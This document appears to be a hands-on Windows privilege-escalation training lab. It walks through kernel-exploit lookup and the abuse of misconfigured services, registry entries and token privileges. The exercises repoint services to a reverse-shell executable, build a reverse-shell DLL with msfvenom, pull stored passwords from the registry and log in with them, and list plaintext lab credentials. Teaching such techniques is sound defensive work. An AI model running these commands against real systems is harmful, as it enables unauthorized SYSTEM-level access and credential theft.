# Windows PrivEsc 

---
## Configuration

1. Connect to vpn.
2. Connect as administrator to your windows server with the ip address given by your coach.   
    - Login : Administrator
    - Password : ThisIsThePasswordYouAreLookingFor!!
3. [Follow this tutorial to stop the automatic shutdown due to end of license](https://digitalitskills.com/how-to-stop-windows-server-auto-shutdown-every-hour-after-license-expire/)
4. [Change the user password](https://computersnstuffwaco.com/how-to-reset-a-user-password-in-active-directory)
    - Login : user
    - Password : password321
6. [Add the user to the remote desktop user group](https://www.top-password.com/blog/add-user-to-remote-desktop-users-group-in-windows-10/)
   - https://www.wintips.org/fix-to-sign-in-remotely-you-need-the-right-to-sign-in-through-remote-desktop-services-server-2016/
   - https://theitbros.com/to-sign-in-remotely-you-need-the-right-to-sign-in-through-remote-desktop-service/#Granting_Allow_Log_On_Through_Remote_Desktop_Services_via_GPO

---

## Kernel Exploits
Windows by default are vulnerable to several vulnerabilities that could allow an attacker to execute malicious code in order to abuse a system. From the other side patching systems sufficiently is one of the main problems in security. Even if an organization has a patching policy in place if important patches are not implemented immediately this can still give short window to an attacker to exploit a vulnerability and escalate his privileges inside a system and therefore inside the network.

### What is a Kernel?
Kernels are the core of any operating system.
Think of it as a layer between application software and the 
actual computer hardware.
The kernel has complete control over the operating system. 
Exploiting a kernel vulnerability can result in execution as the 
SYSTEM user.

### Finding Kernel Exploits
Finding and using kernel exploits is usually a simple process:
1. Enumerate Windows version / patch level (systeminfo).
1. Find matching exploits (Google, ExploitDB, GitHub).
1. Compile and run.

Beware though, as Kernel exploits can often be unstable and 
may be one-shot or cause a system crash.

### Tools
- Windows Exploit Suggester: 
https://github.com/bitsadmin/wesng
- Precompiled Kernel Exploits: 
https://github.com/SecWiki/windows-kernel-exploits
- Watson: https://github.com/rasta-mouse/Watson

### Steps
1. Extract the output of the systeminfo command :
    ````cmd
    systeminfo > systeminfo.txt
    ````
1. Run wesng to find potential exploits:
    ````bash
    python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
    ````
1. Cross-reference results with compiled exploits:
    ````
    https://github.com/SecWiki/windows-kernel-exploits
    ````


---- 

**Exercise :**

Connect to your windows server VMwith user account.

1. What is the kernel version  ? 
    > Your answer
1. [Search on Exploit-DB](https://www.exploit-db.com/). Which vulnerability would be suitable for privilege elevation?
    > Your answer
1. If you have found the right script, it is likely that you will have to modify it. What parameters did you have to change?
    > Your answer
1. Execute a listener on your kali machine
    > Your answer
1. Run the python script.


And BIM!

<details>
  <summary>Hints</summary>
  Blue
</details>


----


## Services Exploits
Services are simply programs that run in the 
background, accepting input or performing regular 
tasks.  
If services run with SYSTEM privileges and are 
misconfigured, exploiting them may lead to command 
execution with SYSTEM privileges as well.

### Service Commands

Query the configuration of a service:
````cmd
sc.exe qc <name>
````
Query the current status of a service:
````cmd
sc.exe query <name>
````
Modify a configuration option of a service:

````cmd
sc.exe config <name> <option>=<value>
````
Start/Stop a service:
````cmd
net start/stop <name>
````

### Insecure Service Permissions
Each service has an ACL which defines certain service-specific 
permissions.  
- Some permissions are innocuous ``(e.g. SERVICE_QUERY_CONFIG,SERVICE_QUERY_STATUS).``  
- Some may be useful ``(e.g. SERVICE_STOP, SERVICE_START).``
- Some are dangerous ``(e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS).``

If our user has permission to change the configuration of a 
service which runs with SYSTEM privileges, we can change 
the executable the service uses to one of our own.

> **Potential Rabbit Hole:** If you can change a service 
configuration but cannot stop/start the service, you may not 
be able to escalate privileges!

---
**Exercise:**

Connect to your windows server VMwith user account.

1. Run winPEAS to check for service misconfigurations:
    ````
    .\winPEASany.exe quiet servicesinfo
    ````
1. Note that we can modify the ``daclsvc`` service.
1. We can confirm this with accesschk.exe:
    ```` 
    .\accesschk.exe /accepteula -uwcqv user daclsvc
    ````
1. Check the current configuration of the service:
    ````
    s.exe qc daclsvc
    ````
1. Check the current status of the service:
    ````
    sc.exe query daclsvc
    ````
1. Reconfigure the service to use our reverse shell executable:
    ````
    sc.exe config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
    ````
1. Start a listener on Kali, and then start the service to trigger the 
exploit:
    ````
    net start daclsvc
    ````

AND BIM!

---



### Unquoted Service Path

Executables in Windows can be run without using their 
extension (e.g. “whoami.exe” can be run by just typing 
“whoami”).  

Some executables take arguments, separated by spaces, e.g. 
someprog.exe arg1 arg2 arg3…
This behavior leads to ambiguity when using absolute paths 
that are unquoted and contain spaces.

Consider the following unquoted path: 
````
C:\Program Files\Some Dir\SomeProgram.exe
````
To us, this obviously runs SomeProgram.exe. To Windows, ``C:\Program`` could be 
the executable, with two arguments: ``Files\Some`` and ``Dir\ SomeProgram.exe``
Windows resolves this ambiguity by checking each of the possibilities in turn.
If we can write to a location Windows checks before the actual executable, we 
can trick the service into executing it instead

--- 

**Exercise :**

Connect to your windows server VMwith user account.

1. Run winPEAS to check for service misconfigurations:
    ````
    .\winPEASany.exe quiet servicesinfo
    ````
2. Note that the “unquotedsvc” service has an unquoted path that 
also contains spaces:
    ````
    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
    ````
3. Confirm this using sc:
    ````
    sc qc unquotedsvc
    ````

4. Use accesschk.exe to check for write permissions:
    ````
    .\accesschk.exe /accepteula -uwdq C:\
    .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
    .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
    ````

5. Copy the reverse shell executable and rename it appropriately:
    ````
    copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
    ````

6. Start a listener on Kali, and then start the service to trigger the exploit:
    ````
    net start unquotedsvc
    `````


AND BIM!

---



### Weak Registry Permissions
The Windows registry stores entries for each service.
Since registry entries can have ACLs, if the ACL is 
misconfigured, it may be possible to modify a service’s 
configuration even if we cannot modify the service 
directly

---
**Exercise :**

Connect to your windows server VMwith user account.

1. Run winPEAS to check for service misconfigurations:
    ````
    .\winPEASany.exe quiet servicesinfo

    ````
2. Note that the “regsvc” service has a weak registry entry. We can confirm this with 
PowerShell:
    ````powershell
    PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
    ````
3. Alternatively accesschk.exe can be used to confirm:
    ````cmd
    .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
    ````
4. Overwrite the ImagePath registry key to point to our reverse shell executable:
    ````
    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
    ````
5. Start a listener on Kali, and then start the service to trigger the exploit:
    ````
    net start regsvc
    ````
AND BIM!

---

### Insecure Service Executables
If the original service executable is modifiable by our 
user, we can simply replace it with our reverse shell 
executable.
Remember to create a backup of the original executable 
if you are exploiting this in a real system!

---

**Exercise :**

Connect to your windows server VMwith user account.

1. Run winPEAS to check for service misconfigurations:
    ````
    .\winPEASany.exe quiet servicesinfo
    ````
2. Note that the “filepermsvc” service has an executable which appears to be 
writable by everyone. We can confirm this with accesschk.exe:
    ````
    .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
    ````
3. Create a backup of the original service executable:
    ````
    copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp 
    ````
4. Copy the reverse shell executable to overwrite the service 
executable:
    ````
    copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
    ````
5. Start a listener on Kali, and then start the service to trigger the 
exploit:
    ````
    net start filepermsvc
    ````

AND BIM!

--- 


### DLL Hijacking
Often a service will try to load functionality from a library 
called a DLL (dynamic-link library). Whatever functionality the 
DLL provides, will be executed with the same privileges as the 
service that loaded it.
If a DLL is loaded with an absolute path, it might be possible 
to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to 
escalate privileges is if a DLL is missing from the system, 
and our user has write access to a directory within the 
PATH that Windows searches for DLLs in.
Unfortunately, initial detection of vulnerable services is 
difficult, and often the entire process is very manual.

---

**Exercise :**

1. Use winPEAS to enumerate non-Windows services:
    ````
    .\winPEASany.exe quiet servicesinfo
    ````
2. Note that the C:\Temp directory is writable and in the PATH. Start by 
enumerating which of these services our user has stop and start access to:
    ````
    .\accesschk.exe /accepteula -uvqc user dllsvc
    ````
3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the 
winPEAS output, the service runs the dllhijackservice.exe executable. We 
can confirm this manually:
    ````
    sc qc dllsvc
    ````
4. Run ``Procmon64.exe`` with administrator privileges. Press 
``Ctrl+L`` to open the Filter menu.
5. Add a new filter on the Process Name matching 
``dllhijackservice.exe``.
6. On the main screen, deselect registry activity and 
network activity.
7. Start the service:
    ````
    net start dllsvc
    ````
8. Back in Procmon, note that a number of “NAME NOT 
FOUND” errors appear, associated with the hijackme.dll file.
9. At some point, Windows tries to find the file in the ``C:\Temp`` 
directory, which as we found earlier, is writable by our user
10. On Kali, generate a reverse shell DLL named hijackme.dll:
    ````
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR-IP LPORT=53 -f dll -o hijackme.dll
    ````
11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a 
listener on Kali and then stop/start the service to trigger the exploit:
    ````
    net stop dllsvc
    net start dllsvc
    ````

AND BIM!

----

## Registry

Plenty of programs store configuration options in the 
Windows Registry.
Windows itself sometimes will store passwords in 
plaintext in the Registry.
It is always worth searching the Registry for passwords

### Searching the Registry for Passwords
The following commands will search the registry for keys and 
values that contain “password”
````
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
````
This usually generates a lot of results, so often it is more 
fruitful to look in known locations

---

**Exercise :**

1. Use winPEAS to check common password locations:
    ````
    .\winPEASany.exe quiet filesinfo userinfo
    ````
    (the final checks will take a long time to complete)
2. The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).
3. We can verify these manually:
    ````
    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
    ````
4. On Kali, we can use the winexe command to spawn a shell using these 
credentials:
    ````
    winexe -U 'admin%password123' //your windows server VMcmd.exe
    ````


AND BIM!

---


## User Privileges
In Windows, user accounts and groups can be assigned 
specific “privileges”.
These privileges grant access to certain abilities.
Some of these abilities can be used to escalate our overall 
privileges to that of SYSTEM.
Highly detailed paper: https://github.com/hatRiot/token-priv

### Listing our Privileges
The whoami command can be used to list our user’s 
privileges, using the /priv option:

````
whoami /priv
````

Note that “disabled” in the state column is irrelevant 
here. If the privilege is listed, your user has it.


### SeImpersonatePrivilege
The SeImpersonatePrivilege grants the ability to impersonate 
any access tokens which it can obtain.
If an access token from a SYSTEM process can be obtained, 
then a new process can be spawned using that token.
The Juicy Potato exploit in a previous section abuses this 
ability.


### SeAssignPrimaryPrivilege
The SeAssignPrimaryPrivilege is similar to 
SeImpersonatePrivilege.
It enables a user to assign an access token to a new process.
Again, this can be exploited with the Juicy Potato exploit

### SeBackupPrivilege
The SeBackupPrivilege grants read access to all objects 
on the system, regardless of their ACL.
Using this privilege, a user could gain access to sensitive 
files, or extract hashes from the registry which could 
then be cracked or used in a pass-the-hash attack.

### SeRestorePrivilege
The SeRestorePrivilege grants write access to all objects on 
the system, regardless of their ACL.
There are a multitude of ways to abuse this privilege:
- Modify service binaries.
- Overwrite DLLs used by SYSTEM processes
- Modify registry settings.

### SeTakeOwnershipPrivilege
The SeTakeOwnershipPrivilege lets the user take ownership 
over an object (the WRITE_OWNER permission).
Once you own an object, you can modify its ACL and grant 
yourself write access.
The same methods used with SeRestorePrivilege then apply.

### Other Privileges (More Advanced)
- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeDebugPrivilege (used by getsystem)